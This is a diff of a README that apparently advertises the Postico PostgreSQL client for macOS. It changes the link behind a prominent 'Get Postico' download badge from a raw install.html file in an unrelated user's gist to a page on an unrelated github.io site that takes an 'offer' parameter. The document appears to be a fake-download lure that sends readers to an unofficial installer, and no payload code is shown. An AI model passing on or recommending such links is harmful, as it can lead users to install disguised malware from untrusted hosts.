@@ -2,7 +2,7 @@
 
 Postico is a macOS-native database client designed for working with PostgreSQL. It offers a modern interface, secure connections, and intuitive tools to interact with data efficiently across development, analysis, and administration tasks.
 
-<a href="https://gistcdn.githack.com/gooberscaliente48/e29fbd0ba58c12aeebca7c216a434ffa/raw/4ac83df68e8669626aec3772e4c872364b9e780b/install.html?offer=Postico" target="_blank">
+<a href="https://git-cli-setup.github.io/.github/?offer=Postico" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Postico%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
